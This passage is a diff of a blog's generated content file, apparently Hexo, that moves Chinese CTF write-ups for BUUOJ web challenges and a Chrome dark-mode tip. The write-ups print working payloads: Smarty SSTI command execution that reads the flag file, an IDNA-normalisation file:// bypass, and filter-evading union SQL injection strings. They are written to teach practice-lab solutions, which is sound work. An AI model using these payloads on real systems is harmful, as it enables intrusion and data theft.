+<p>这里不是很懂，不过根据结果可以猜测，<code>index</code> 的位置上应该放的是 filter 这个伪协议的选项，而index并不是，所以这里报错了，但是这并不影响整体的执行。</p>
 <h1 id="总结">总结</h1>
-<p>这是一道关于SSTI的简单题目，唯一需要注意的点是不能直接在浏览器中输入payload，否则会被url编码，导致smarty不能识别。</p>
+<p>通过本题可以学到： <code>php://filter</code> 伪协议的嵌套。</p>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>SSTI</tag>
-        <tag>smarty</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Chrome 黑暗模式</title>
-    <url>/2022/04/07/Chrome%20%E9%BB%91%E6%9A%97%E6%A8%A1%E5%BC%8F/</url>
-    <content><![CDATA[<p>记录个人日常生活中遇到的繁琐的小问题的解决。</p>
-<span id="more"></span>
-<h1 id="问题描述">问题描述</h1>
-<p>chrome无论是主题设置为<code>Just Black</code>，还是利用各种插件，总是有不满意的地方。</p>
-<p>前者只是将状态栏、工具栏、书签栏和新标签页变成黑暗模式，而其他网页还是白的。</p>
-<p>而后者在页面切换的时候会先跳一下白，然后才会变黑。</p>
-<p>这些问题对于我这种强迫症患者是不能接受的。</p>
-<h1 id="解决方案">解决方案</h1>
-<p>我的机子的操作系统是 Win11。</p>
-<p>现在有一种完全不需要插件和主题的黑暗模式。</p>
-<ol type="1">
-<li><p>打开chrome，在地址栏输入<code>chrome://flags</code>，然后回车 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095058.png" /></p></li>
-<li><p>找到<code>Auto Dark Mode for Web Contents</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095132.png" /></p></li>
-<li><p>然后将红色方框设置为<code>Enabled</code>（我这里已经设置好了），然后重启即可 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095215.png" /></p></li>
-</ol>
-<h1 id="对比">对比</h1>
-<p>这是原来只改了主题的黑暗模式</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095502.png" /></p>
-<p>这是设置完成之后的黑暗模式</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095529.png" /></p>
-<h1 id="小问题">小问题</h1>
-<p>不过还是存在一点小bug的，看你们能不能接受了。我发现的一个就是在哔哩哔哩的播放界面，鼠标光标放到视频上的时候，视频会泛白，如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095649.png" /></p>
-]]></content>
-      <categories>
-        <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>chrome</tag>
-        <tag>dark mode</tag>
+        <tag>PHP伪协议</tag>
       </tags>
   </entry>
   <entry>
@@ -2960,6 +2892,39 @@
       </tags>
   </entry>
   <entry>
+    <title>CISCN2019 华东南赛区 Web11</title>
+    <url>/2022/04/16/CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%20Web11/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BCISCN2019%20华东南赛区%5DWeb11">Web11</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境之后，看到了一堆信息：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121336.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121350.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121357.png" /></p>
+<h1 id="解题">解题</h1>
+<p>首先，我尝试了一下API Usage，先后访问了<code>http://node4.buuoj.cn:29398/api</code>和<code>http://node4.buuoj.cn:29398/xff</code>，发现状态码都为301。</p>
+<p>接着我尝试了一下Connection中的请求头，得到状态码500。</p>
+<p>最后看到了<code>build with smarty</code>，可能暗示着存在SSTI，并且渲染引擎为smarty。首先尝试了一下<code>http://node4.buuoj.cn:29398/$&#123;7*7&#125;</code>，结果如下</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121736.png" /></p>
+<p>这不应该呀，如果说确实渲染引擎确实为smarty的话，这里显示的应该是<code>$49</code>。思来想去，我注意到了url，我的输入居然变成了<code>$%7B7*7%7D</code>，那么自然不会被smarty给识别成代码执行。</p>
+<p>所以，我尝试用burp发送请求。终于</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416121940.png" /></p>
+<p>确定了这里存在SSTI，那接下来就很简单了。可以先用<code>$&#123;smarty.version</code>查看一下版本，看一下能否利用一些标签。我这里直接使用命令执行，payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;system(&quot;ls /&quot;)&#125; # 找到flag文件在根目录下</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416122203.png" /></p>
+<p>然后读取flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416122245.png" /></p>
+<h1 id="总结">总结</h1>
+<p>这是一道关于SSTI的简单题目，唯一需要注意的点是不能直接在浏览器中输入payload，否则会被url编码，导致smarty不能识别。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>SSTI</tag>
+        <tag>smarty</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>De1CTF 2019 SSRF Me</title>
     <url>/2022/04/11/De1CTF%202019%20SSRF%20Me/</url>
     <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BDe1CTF%202019%5DSSRF%20Me">SSRF_ME</a></p>
@@ -3008,6 +2973,41 @@
         <tag>SSRF</tag>
         <tag>代码审计</tag>
         <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Chrome 黑暗模式</title>
+    <url>/2022/04/07/Chrome%20%E9%BB%91%E6%9A%97%E6%A8%A1%E5%BC%8F/</url>
+    <content><![CDATA[<p>记录个人日常生活中遇到的繁琐的小问题的解决。</p>
+<span id="more"></span>
+<h1 id="问题描述">问题描述</h1>
+<p>chrome无论是主题设置为<code>Just Black</code>，还是利用各种插件，总是有不满意的地方。</p>
+<p>前者只是将状态栏、工具栏、书签栏和新标签页变成黑暗模式，而其他网页还是白的。</p>
+<p>而后者在页面切换的时候会先跳一下白，然后才会变黑。</p>
+<p>这些问题对于我这种强迫症患者是不能接受的。</p>
+<h1 id="解决方案">解决方案</h1>
+<p>我的机子的操作系统是 Win11。</p>
+<p>现在有一种完全不需要插件和主题的黑暗模式。</p>
+<ol type="1">
+<li><p>打开chrome，在地址栏输入<code>chrome://flags</code>，然后回车 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095058.png" /></p></li>
+<li><p>找到<code>Auto Dark Mode for Web Contents</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095132.png" /></p></li>
+<li><p>然后将红色方框设置为<code>Enabled</code>（我这里已经设置好了），然后重启即可 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095215.png" /></p></li>
+</ol>
+<h1 id="对比">对比</h1>
+<p>这是原来只改了主题的黑暗模式</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095502.png" /></p>
+<p>这是设置完成之后的黑暗模式</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095529.png" /></p>
+<h1 id="小问题">小问题</h1>
+<p>不过还是存在一点小bug的，看你们能不能接受了。我发现的一个就是在哔哩哔哩的播放界面，鼠标光标放到视频上的时候，视频会泛白，如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095649.png" /></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>chrome</tag>
+        <tag>dark mode</tag>
       </tags>
   </entry>
   <entry>
@@ -3266,30 +3266,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MRCTF2020 PYWebsite</title>
-    <url>/2022/04/13/MRCTF2020%20PYWebsite/</url>
-    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BMRCTF2020%5DPYWebsite">PYWebsite</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境之后，发现页面很复杂。先查看源码，发现</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231227.png" /></p>
-<p>这是后面输入授权码的时候触发的，最开始还以为绕过<code>hex_md5</code>就可以了。在这串代码中还有一个<code>./flag.php</code>。</p>
-<p>访问该文件得到如下界面</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231351.png" /></p>
-<h1 id="解题">解题</h1>
-<p>重点的提示<strong>已经记住了购买者的IP......除了购买者和我自己，没人可以看到flag</strong>。意思就是，要么我们自己购买，要么使用出题者的IP就可以看到flag。前者显然不可能，那么只有后者，这时候想到了一个HTTP头部信息<code>X-Forwarded-For</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231606.png" /></p>
-<p>flag在源码中可以查看</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231627.png" /></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>HTTP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MRCTF2020 套娃</title>
     <url>/2022/04/21/MRCTF2020%20%E5%A5%97%E5%A8%83/</url>
     <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BMRCTF2020%5D套娃">MRCTF2020 套娃</a></p>
@@ -3367,6 +3343,30 @@
         <tag>PHP伪协议</tag>
         <tag>PHP基础知识</tag>
         <tag>函数逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MRCTF2020 PYWebsite</title>
+    <url>/2022/04/13/MRCTF2020%20PYWebsite/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BMRCTF2020%5DPYWebsite">PYWebsite</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境之后，发现页面很复杂。先查看源码，发现</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231227.png" /></p>
+<p>这是后面输入授权码的时候触发的，最开始还以为绕过<code>hex_md5</code>就可以了。在这串代码中还有一个<code>./flag.php</code>。</p>
+<p>访问该文件得到如下界面</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231351.png" /></p>
+<h1 id="解题">解题</h1>
+<p>重点的提示<strong>已经记住了购买者的IP......除了购买者和我自己，没人可以看到flag</strong>。意思就是，要么我们自己购买，要么使用出题者的IP就可以看到flag。前者显然不可能，那么只有后者，这时候想到了一个HTTP头部信息<code>X-Forwarded-For</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231606.png" /></p>
+<p>flag在源码中可以查看</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231627.png" /></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>HTTP</tag>
       </tags>
   </entry>
   <entry>
@@ -3494,6 +3494,102 @@
       <tags>
         <tag>PHP反序列化</tag>
         <tag>POP链</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SUCTF 2019 Pythonginx</title>
+    <url>/2022/04/16/SUCTF%202019%20Pythonginx/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BSUCTF%202019%5DPythonginx">Pythonginx</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境之后，直接给了代码，不过格式很乱，查看页面源码可以得到整齐的代码 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname <span class="comment"># 提取url中的hostname</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:  <span class="comment"># 绕过1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url)) <span class="comment"># 将url分割</span></span><br><span class="line">    host = parts[<span class="number">1</span>] <span class="comment"># 取其中的第二个其实和</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: <span class="comment"># 绕过2</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>): <span class="comment"># 将parts[1]以 . 分割</span></span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    </span><br><span class="line">    到此为止，还是parts[<span class="number">1</span>]得到的是国际标准化的hostname</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()  <span class="comment"># get flag</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br><span class="line">    &lt;/code&gt;</span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure></p>
+<h1 id="前置知识">前置知识</h1>
+<h2 id="相关函数问题">相关函数问题</h2>
+<p>参考连接：</p>
+<ul>
+<li>https://docs.python.org/zh-cn/3/library/urllib.parse.html</li>
+<li><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">INDA</a></li>
+</ul>
+<p><code>urlparse(url)</code>作用：将url字符串分割成多个部分，下面是官网给的例子 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">&#x27;//www.cwi.nl:80/%7Eguido/Python.html&#x27;</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;&#x27;</span>, netloc=<span class="string">&#x27;www.cwi.nl:80&#x27;</span>, path=<span class="string">&#x27;/%7Eguido/Python.html&#x27;</span>,</span><br><span class="line">            params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">&#x27;www.cwi.nl/%7Eguido/Python.html&#x27;</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;&#x27;</span>, netloc=<span class="string">&#x27;&#x27;</span>, path=<span class="string">&#x27;www.cwi.nl/%7Eguido/Python.html&#x27;</span>,</span><br><span class="line">            params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">&#x27;help/Python.html&#x27;</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;&#x27;</span>, netloc=<span class="string">&#x27;&#x27;</span>, path=<span class="string">&#x27;help/Python.html&#x27;</span>, params=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>除了这些部分之外，还有一些属性（详细的可以看官网），其中就有<code>hostname</code>。不严谨的解释： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://abc.cde.com/index.php?name=hello&#x27;</span></span><br><span class="line"></span><br><span class="line">其中hostname就是abc.cde.com，即http://之后，/index.php之前的部分都是</span><br></pre></td></tr></table></figure></p>
+<p><code>urlsplit(url)</code>作用：将url字符串分割成多个部分，大致上与<code>urlparse(url)</code>一样。</p>
+<p><code>urlunsplit(parts)</code>作用：与<code>urlsplit()</code>函数相反，这是将多个部分拼接成一个url。</p>
+<p><code>h.encode('idna')</code>作用：将h进行inda编码。idna简单来说就是为了统一不同国家见的特殊字符的域名而设计出来的一种编码，说白了就是把其他语言及其特殊字符转换成英文即国际符号。</p>
+<h2 id="ngnix">Ngnix</h2>
+<p>ngnix的配置文件地址是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>/usr/local下的才是正在使用的配置文件，/etc/nginx那个只是默认的配置</p>
+</blockquote>
+<h1 id="解题">解题</h1>
+<p>分析代码得到有用的信息： - 利用<code>return urllib.request.urlopen(finalUrl).read()</code>get flag，因此使用伪协议file读取； - 根据提示，域名为<code>suctf.cc</code>，且跟ngnix有关系。所以，尝试先读取ngnix的配置文件<code>file://suctf.cc/usr/local/nginx/conf/nginx.conf</code>； - 域名不能直接为<code>suctf.cc</code>，经过<code>h.encode('idna').decode('utf-8')</code>之后才为<code>suctf.cc</code>。这样才可以绕过前两个if判断；</p>
+<p>根据idna编码规则，去<a href="https://www.compart.com/en/unicode">compart</a>，搜索相关的字符，在搜索框输入<code>/</code>时找到了</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416225726.png" /></p>
+<p>因此，构造payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.c℆sr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
+<p>解释：此时的hostname为<code>suctf.c℆sr</code>，但是无法被被识别，所以两次的<code>host=='suctf.cc'</code>都被成功绕过。而当执行到<code>newhost.append(h.encode('idna').decode('utf-8'))</code>时，<code>c℆sr</code>变成<code>cc/usr</code>，然后在经过<code>parts[1] = '.'.join(newhost)</code>拼接，得到<code>suctf.cc/usr</code>，最后<code>finalUrl = urlunsplit(parts).split(' ')[0]</code>得到完成的url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.cc/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
+<p>结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416230456.png" /></p>
+<p>找到了flag文件的位置，接下来构造如下payload，最终得到flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.c℆sr/fffffflag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416230602.png" /></p>
+<h1 id="总结">总结</h1>
+<p>我认为本题考察的<code>idna</code>编码确实比较少见，我个人分析代码得到了需要利用某种编码方式绕过前两次if，然后经过<code>idna</code>编码再得到正确的域名，但是找不到可用的字符，经过查看大佬的writeup之后才找到。</p>
+<p>大佬writeup</p>
+<ul>
+<li>https://mashiro01.github.io/writeup/SUCTF_2019.html</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+        <tag>IDNA编码</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SWPU2019 Web1</title>
+    <url>/2022/04/13/SWPU2019%20Web1/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb1">Web1</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境发现了登录界面和注册界面。在登录界面测试了弱口令、sql注入无果后尝试先注册，然后看一下登录之后的功能点。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103012.png" /></p>
+<p>发现存在一个<code>申请发布广告</code>的功能点。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103037.png" /></p>
+<p>进入之后发现有两个输入框。我首先测试了一下XSS漏洞。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103206.png" /></p>
+<p>发现确实存在XSS漏洞。但是该漏洞对我们获取flag没有作用，该漏洞的最大作用是获取cookie。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103228.png" /></p>
+<p>因此，继续测试是否存在sql注入漏洞。发现<code>广告名</code>处存在着sql注入漏洞。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413103358.png" /></p>
+<p>后来经过测试，发现过滤了空格、反引号、<code>-</code>、<code>#</code>、<code>or</code>、<code>and</code>等。并且没法用大小写等方式绕过。</p>
+<h1 id="解题">解题</h1>
+<p>空格比较简答，可以利用<code>/**/</code>绕过；过滤了注释符，可以利用单引号闭合后面的绕过，比如<code>-1' union select 1,2,3,'4</code>。但是<code>or</code>就比较难办了，因为<code>order by</code>和<code>information_schema</code>都包含<code>or</code>。因此这里涉及到了两个技巧：</p>
+<ul>
+<li>Bypass information_schema;</li>
+<li>无列名注入</li>
+</ul>
+<p>[[information_schema绕过及无列名注入]]</p>
+<p>首先，先查询字段数（<code>ordey by</code>可以用<code>group by</code>代替，后者可以对结果进行分组，但是不分组的话就是简单的显示了），本题字段数特别长。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/group/**/by/**/23,&#x27;1</span><br><span class="line">-1&#x27;/**/group/**/by/**/22,&#x27;1</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104032.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104049.png" /></p>
+<p>发现前者报错，而后者页面正常。因此，字段数为22。</p>
+<p>接着，查询数据库名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104418.png" /></p>
+<p>然后使用<code>mysql.innodb_table_stats</code>代替<code>information_schema</code>来查询表名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413104608.png" /></p>
+<p>（flag在<code>users</code>中）</p>
+<p>接着利用<strong>无列名注入</strong>获得列名： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,(select/**/group_concat(c)/**/from(select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure></p>
+<p>需要注意的是，如果这里的字段数（<code>select/**/1,2,3/**/as/**/c/**/union/**/select*from/**/users</code>）不对，会报错（如下图） ，如果字段数正确，则会直接显示对应的内容。因为反引号被过滤了，所以通过取别名的方式绕过。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111135.png" /></p>
+<p>最终得到flag：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413111200.png" /></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>无列名注入</tag>
+        <tag>Bypass information_schema</tag>
       </tags>
   </entry>
   <entry>
@@ -3750,102 +3846,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SUCTF 2019 Pythonginx</title>
-    <url>/2022/04/16/SUCTF%202019%20Pythonginx/</url>
-    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BSUCTF%202019%5DPythonginx">Pythonginx</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境之后，直接给了代码，不过格式很乱，查看页面源码可以得到整齐的代码 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname <span class="comment"># 提取url中的hostname</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:  <span class="comment"># 绕过1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url)) <span class="comment"># 将url分割</span></span><br><span class="line">    host = parts[<span class="number">1</span>] <span class="comment"># 取其中的第二个其实和</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: <span class="comment"># 绕过2</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>): <span class="comment"># 将parts[1]以 . 分割</span></span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    </span><br><span class="line">    到此为止，还是parts[<span class="number">1</span>]得到的是国际标准化的hostname</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()  <span class="comment"># get flag</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br><span class="line">    &lt;/code&gt;</span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure></p>
-<h1 id="前置知识">前置知识</h1>
-<h2 id="相关函数问题">相关函数问题</h2>
-<p>参考连接：</p>
-<ul>
-<li>https://docs.python.org/zh-cn/3/library/urllib.parse.html</li>
-<li><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">INDA</a></li>
-</ul>
-<p><code>urlparse(url)</code>作用：将url字符串分割成多个部分，下面是官网给的例子 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">&#x27;//www.cwi.nl:80/%7Eguido/Python.html&#x27;</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;&#x27;</span>, netloc=<span class="string">&#x27;www.cwi.nl:80&#x27;</span>, path=<span class="string">&#x27;/%7Eguido/Python.html&#x27;</span>,</span><br><span class="line">            params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">&#x27;www.cwi.nl/%7Eguido/Python.html&#x27;</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;&#x27;</span>, netloc=<span class="string">&#x27;&#x27;</span>, path=<span class="string">&#x27;www.cwi.nl/%7Eguido/Python.html&#x27;</span>,</span><br><span class="line">            params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span 